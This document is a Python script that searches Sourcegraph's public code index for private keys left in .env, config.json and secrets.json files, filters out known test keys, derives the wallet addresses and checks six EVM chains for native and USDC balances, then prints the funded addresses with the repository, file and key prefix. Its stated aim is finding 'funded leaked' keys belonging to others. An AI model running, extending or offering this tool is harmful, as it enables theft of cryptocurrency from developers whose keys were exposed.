#!/usr/bin/env python3
"""Aggressive Sourcegraph + balance sweep for funded leaked EVM keys."""

from __future__ import annotations

import json
import re
import sys
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from decimal import Decimal
from eth_account import Account
from web3 import Web3

Account.enable_unaudited_hdwallet_features()

HEX64 = re.compile(r"(?:0x)?([a-fA-F0-9]{64})")
SKIP = re.compile(
    r"ac0974bec39a17e36ba4a6b4d238ff|59c6995e998f97a5a0044966f0945389|"
    r"5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a|"
    r"7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6|"
    r"1dd171cec7e2995408b5513004e8207fe88d6820aeff0d82463b3e41df251aae|"
    r"abcdef1234567890|0000000000000000|your_private|YOUR_PRIVATE|0x\.\.\.|example|sample|junk",
    re.I,
)

QUERIES = [
    'context:global pattern:/[a-fA-F0-9]{64}/ file:.env -file:.env.example -0xac0974bec39a17e36ba4a6b4d238ff',
    'context:global file:.env PRIVATE_KEY=0x -file:.env.example -0xac0974',
    'context:global file:.env WALLET_PRIVATE_KEY=0x -file:.env.example',
    'context:global file:.env POLYMARKET_PRIVATE_KEY=0x -file:.env.example -0x\.\.\.',
    'context:global file:.env MAINNET_PRIVATE_KEY=0x -file:.env.example',
    'context:global file:.env SIGNER_PRIVATE_KEY=0x -file:.env.example -0xac0974',
    'context:global file:.env OPERATOR_PRIVATE_KEY=0x -file:.env.example',
    'context:global file:config.json privateKey',
    'context:global file:secrets.json privateKey',
]

CHAINS = {
    "ethereum": "https://ethereum.publicnode.com",
    "base": "https://base.publicnode.com",
    "polygon": "https://polygon-bor.publicnode.com",
    "arbitrum": "https://arbitrum-one.publicnode.com",
    "bsc": "https://bsc.publicnode.com",
    "blast": "https://rpc.blast.io",
}

USDC = {
    "polygon": ("0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", 6),
    "ethereum": ("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 6),
    "base": ("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 6),
    "arbitrum": ("0xaf88d065e77c1cA973D17D1F1A0e0C6Ac2f1e246", 6),
}

ERC20_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function",
    }
]


def sg_stream(query: str, pattern: str = "regexp") -> list[dict]:
    url = (
        "https://sourcegraph.com/.api/search/stream?q="
        + urllib.parse.quote(query)
        + f"&patternType={pattern}&display=5000"
    )
    req = urllib.request.Request(url, headers={"Accept": "text/event-stream", "User-Agent": "ens-funded-hunt"})
    out = []
    with urllib.request.urlopen(req, timeout=60) as resp:
        for raw in resp:
            line = raw.decode("utf-8", "replace").strip()
            if not line.startswith("data: "):
                continue
            try:
                items = json.loads(line[6:])
            except json.JSONDecodeError:
                continue
            if isinstance(items, list):
                out.extend(items)
    return out


def extract_keys(matches: list[dict]) -> dict[str, tuple[str, str, str]]:
    found: dict[str, tuple[str, str, str]] = {}
    for item in matches:
        if item.get("type") != "content":
            continue
        repo = item.get("repository", "")
        path = item.get("path", "")
        if any(x in path.lower() for x in (".example", ".sample", "test", "mock")):
            continue
        for lm in item.get("lineMatches", []):
            text = lm.get("line", "")
            for m in HEX64.finditer(text):
                h = m.group(1).lower()
                if SKIP.search(h) or SKIP.search(text):
                    continue
                found[h] = (repo, path, text.strip()[:120])
    return found


def check_key(hex_key: str, meta: tuple[str, str, str]) -> list[dict]:
    addr = Account.from_key(bytes.fromhex(hex_key)).address
    w3s = {n: Web3(Web3.HTTPProvider(u, request_kwargs={"timeout": 12})) for n, u in CHAINS.items()}
    rows = []
    min_wei = 10**15  # 0.001 ETH threshold
    for chain, w3 in w3s.items():
        try:
            bal = w3.eth.get_balance(Web3.to_checksum_address(addr))
            if bal >= min_wei:
                rows.append(
                    {
                        "asset": "NATIVE",
                        "chain": chain,
                        "address": addr,
                        "balance": str(Decimal(bal) / Decimal(10**18)),
                        "repo": meta[0],
                        "file": meta[1],
                        "line": meta[2],
                        "key_prefix": hex_key[:16],
                    }
                )
        except Exception:
            pass
        if chain in USDC:
            token, dec = USDC[chain]
            try:
                c = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
                raw = c.functions.balanceOf(Web3.to_checksum_address(addr)).call()
                if raw >= 10 ** (dec - 2):  # >= $0.01-ish
                    rows.append(
                        {
                            "asset": "USDC",
                            "chain": chain,
                            "address": addr,
                            "balance": str(Decimal(raw) / Decimal(10**dec)),
                            "repo": meta[0],
                            "file": meta[1],
                            "line": meta[2],
                            "key_prefix": hex_key[:16],
                        }
                    )
            except Exception:
                pass
    return rows


def main() -> None:
    all_keys: dict[str, tuple[str, str, str]] = {}
    for q in QUERIES:
        print(f"Searching: {q[:70]}...", file=sys.stderr)
        try:
            matches = sg_stream(q)
            batch = extract_keys(matches)
            print(f"  -> {len(batch)} keys", file=sys.stderr)
            all_keys.update(batch)
        except Exception as e:
            print(f"  !! {e}", file=sys.stderr)

    print(f"\nTotal unique keys to check: {len(all_keys)}", file=sys.stderr)
    funded: list[dict] = []
    with ThreadPoolExecutor(max_workers=16) as pool:
        futs = {pool.submit(check_key, h, m): h for h, m in all_keys.items()}
        done = 0
        for fut in as_completed(futs):
            done += 1
            if done % 25 == 0:
                print(f"  checked {done}/{len(all_keys)}", file=sys.stderr)
            funded.extend(fut.result())

    print("\n" + "=" * 90)
    print(f"FUNDED ADDRESSES (>=0.001 ETH or >=$0.01 USDC): {len(funded)}")
    print("=" * 90)
    if not funded:
        print("None found.")
    for r in sorted(funded, key=lambda x: -float(x["balance"])):
        print(f"{r['chain']:10} {r['asset']:6} {r['balance']:>18}  {r['address']}")
        print(f"  {r['repo']} — {r['file']}")
        print(f"  {r['line']}")
        print(f"  key: {r['key_prefix']}...")


if __name__ == "__main__":
    main()
